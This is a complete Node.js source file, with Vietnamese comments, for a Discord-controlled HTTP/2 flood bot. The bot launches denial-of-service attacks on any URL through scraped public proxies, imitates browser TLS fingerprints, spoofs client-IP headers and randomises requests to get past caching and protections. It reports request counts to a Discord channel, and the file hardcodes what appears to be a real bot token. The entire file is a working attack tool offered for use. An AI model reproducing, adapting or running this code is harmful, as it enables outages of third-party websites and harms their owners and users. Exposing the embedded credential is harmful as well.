// ==++==
// HTTPV7-DISCORD-BOT.js - Flood Control via Discord
// Chạy: node HTTPV7-DISCORD-BOT.js
// ==++==

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

// ==================== DISCORD CONFIG ====================
const TOKEN = 'MTQ1NjU5ODMxNDI3NDM5NDE2NA.G4Quyv.13gehaq3kmb3hPy8bbuswTLxqSjnhk0DqeJ1qw';  // Thay token bot của bạn
const CHANNEL_ID = '1456595444477198508'; // Thay channel ID
const PREFIX = '!Flood'; // Prefix cho lệnh

// ==================== THƯ VIỆN ====================
const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const path = require("path");

// ==================== BIẾN TOÀN CỤC ====================
let currentAttack = null;
let proxyList = [];
let stats = { total: 0, rps: 0 };
let workers = [];

// ==================== TẢI PROXY TỰ ĐỘNG ====================
async function loadProxies() {
    try {
        // Thử đọc file proxy.txt trong thư mục hiện tại
        if (fs.existsSync('./proxy.txt')) {
            proxyList = fs.readFileSync('./proxy.txt', 'utf-8')
                .split('\n')
                .filter(line => line.includes(':'));
            console.log(`[+] Loaded ${proxyList.length} proxies from file`.green);
        } else {
            // Tự động tải proxy từ nguồn
            const axios = require('axios');
            const sources = [
                'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
            ];
            
            for (const src of sources) {
                try {
                    const res = await axios.get(src, { timeout: 5000 });
                    const proxies = res.data.split('\n').filter(line => line.includes(':'));
                    proxyList.push(...proxies);
                } catch (e) {}
            }
            
            // Loại bỏ trùng lặp
            proxyList = [...new Set(proxyList)];
            fs.writeFileSync('./proxy.txt', proxyList.join('\n'));
            console.log(`[+] Downloaded ${proxyList.length} proxies`.green);
        }
    } catch (e) {
        console.log(`[!] No proxies loaded, using direct connection`.yellow);
        proxyList = ['direct'];
    }
}

// ==================== TLS CONFIG ====================
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method"
});

// ==================== RANDOM ====================
function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let output = "";
    for (let count = 0; count < length; count++) {
        output += chars[Math.floor(Math.random() * chars.length)];
    }
    return output;
}

function randomIP() {
    return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`;
}

// ==================== USER-AGENT LIST ====================
const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36'
];

// ==================== HEADER LISTS ====================
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    '*/*'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate'
];

const lang_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8'
];

const cache_header = ['no-cache', 'max-age=0'];
const platform = ["Windows", "macOS", "Linux", "Android", "iOS"];

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true
        });

        connection.setTimeout(3000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);
        
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) 
                callback(connection);
            else {
                connection.destroy();
                callback(null, "403");
            }
        });
        connection.on("timeout", () => {
            connection.destroy();
            callback(null, "timeout");
        });
        connection.on("error", () => {
            connection.destroy();
            callback(null, "error");
        });
    }
}

// ==================== WORKER FLOOD ====================
function createWorker(target, rate, threads) {
    const parsedTarget = url.parse(target);
    const Socker = new NetSocket();
    let count = 0;
    
    setInterval(() => {
        if (count > 0 && process.send) {
            process.send({ type: 'stats', count });
            count = 0;
        }
    }, 1000);
    
    function flood() {
        const proxyAddr = proxyList[Math.floor(Math.random() * proxyList.length)];
        if (!proxyAddr) return setTimeout(flood, 100);
        
        const [proxyHost, proxyPort] = proxyAddr.split(':');
        
        const headers = {
            ":method": "GET",
            ":path": parsedTarget.path + '?' + randomString(8),
            ":authority": parsedTarget.host,
            "user-agent": randomElement(uap),
            "accept": randomElement(accept_header),
            "accept-encoding": randomElement(encoding_header),
            "accept-language": randomElement(lang_header),
            "cache-control": randomElement(cache_header),
            "pragma": "no-cache",
            "referer": "https://www.google.com/",
            "sec-ch-ua": `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": `"${randomElement(platform)}"`,
            "x-forwarded-for": randomIP(),
            "x-real-ip": randomIP(),
            "cookie": `cf=${randomString(20)}; session=${randomString(16)}`
        };

        Socker.HTTP({
            host: proxyHost,
            port: parseInt(proxyPort),
            address: parsedTarget.host + ":443"
        }, (connection, error) => {
            if (error || !connection) return;
            
            const tlsConn = tls.connect({
                socket: connection,
                ALPNProtocols: ["h2"],
                servername: parsedTarget.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });
            
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { maxConcurrentStreams: 2000 }
            });
            
            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    try {
                        const req = client.request(headers);
                        req.on('error', () => {});
                        req.end();
                        count++;
                    } catch (e) {}
                }
                setTimeout(() => {
                    try { client.close(); } catch (e) {}
                }, 100);
            });
            
            client.on('error', () => {
                try { client.destroy(); } catch (e) {}
            });
        });
        
        setImmediate(flood);
    }
    
    flood();
}

// ==================== DISCORD BOT ====================
client.once('ready', () => {
    console.log(`[+] Bot ${client.user.tag} đã sẵn sàng!`.green);
    const channel = client.channels.cache.get(CHANNEL_ID);
    if (channel) {
        channel.send(`
╔══════════════════════════════════════════════════════╗
║        HTTPV7 FLOOD BOT - READY TO ATTACK           ║
╠══════════════════════════════════════════════════════╣
║  Lệnh:                                               ║
║  !flood <url> <time> <rate> <threads>               ║
║  !stop                                               ║
║  !status                                             ║
║  !help                                               ║
╚══════════════════════════════════════════════════════╝
        `);
    }
});

client.on('messageCreate', async (message) => {
    if (message.channel.id !== CHANNEL_ID) return;
    if (!message.content.startsWith(PREFIX)) return;
    
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    
    if (command === 'help') {
        message.channel.send(`
**📚 HƯỚNG DẪN LỆNH**
\`!flood <url> <time> <rate> <threads>\` - Bắt đầu tấn công
\`!stop\` - Dừng tấn công
\`!status\` - Xem trạng thái
\`!help\` - Hiện hướng dẫn

**Ví dụ:** \`!flood https://example.com 120 500 10\`
        `);
    }
    
    else if (command === 'flood') {
        if (args.length < 4) {
            return message.channel.send('❌ Thiếu tham số! Dùng: !flood <url> <time> <rate> <threads>');
        }
        
        const target = args[0];
        const time = parseInt(args[1]);
        const rate = parseInt(args[2]);
        const threads = parseInt(args[3]);
        
        if (!target.startsWith('http')) {
            return message.channel.send('❌ URL phải bắt đầu bằng http:// hoặc https://');
        }
        
        if (isNaN(time) || time < 10) {
            return message.channel.send('❌ Thời gian phải >= 10 giây');
        }
        
        if (isNaN(rate) || rate < 10) {
            return message.channel.send('❌ Rate phải >= 10');
        }
        
        if (isNaN(threads) || threads < 1) {
            return message.channel.send('❌ Threads phải >= 1');
        }
        
        // Dừng attack cũ nếu có
        if (currentAttack) {
            for (const worker of workers) {
                worker.kill();
            }
            workers = [];
            currentAttack = null;
        }
        
        message.channel.send(`
**🔥 BẮT ĐẦU TẤN CÔNG**
Target: ${target}
Time: ${time}s
Rate: ${rate}
Threads: ${threads}
Proxy: ${proxyList.length} proxies
        `);
        
        // Fork workers
        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                const worker = cluster.fork();
                worker.send({ target, rate, threads });
                workers.push(worker);
            }
            
            currentAttack = {
                target,
                time,
                startTime: Date.now()
            };
            
            stats.total = 0;
            
            cluster.on('message', (worker, msg) => {
                if (msg.type === 'stats') {
                    stats.total += msg.count || 0;
                }
            });
            
            // Tự động dừng sau thời gian
            setTimeout(() => {
                if (currentAttack) {
                    for (const worker of workers) {
                        worker.kill();
                    }
                    workers = [];
                    currentAttack = null;
                    
                    const channel = client.channels.cache.get(CHANNEL_ID);
                    if (channel) {
                        channel.send(`✅ **KẾT THÚC TẤN CÔNG** - Tổng requests: ${stats.total.toLocaleString()}`);
                    }
                }
            }, time * 1000);
        }
    }
    
    else if (command === 'stop') {
        if (currentAttack) {
            for (const worker of workers) {
                worker.kill();
            }
            workers = [];
            currentAttack = null;
            message.channel.send('🛑 **ĐÃ DỪNG TẤN CÔNG**');
        } else {
            message.channel.send('⚠️ Không có attack nào đang chạy');
        }
    }
    
    else if (command === 'status') {
        if (currentAttack) {
            const elapsed = Math.floor((Date.now() - currentAttack.startTime) / 1000);
            const rps = Math.floor(stats.total / (elapsed || 1));
            
            message.channel.send(`
**📊 TRẠNG THÁI TẤN CÔNG**
Target: ${currentAttack.target}
Thời gian: ${elapsed}s / ${currentAttack.time}s
Requests: ${stats.total.toLocaleString()}
RPS: ${rps.toLocaleString()}
Workers: ${workers.length}
Proxy: ${proxyList.length}
            `);
        } else {
            message.channel.send('📴 Không có attack nào đang chạy');
        }
    }
});

// ==================== MAIN ====================
async function main() {
    await loadProxies();
    
    if (cluster.isMaster) {
        client.login(TOKEN);
    } else {
        process.on('message', (data) => {
            createWorker(data.target, data.rate, data.threads);
        });
    }
}

main();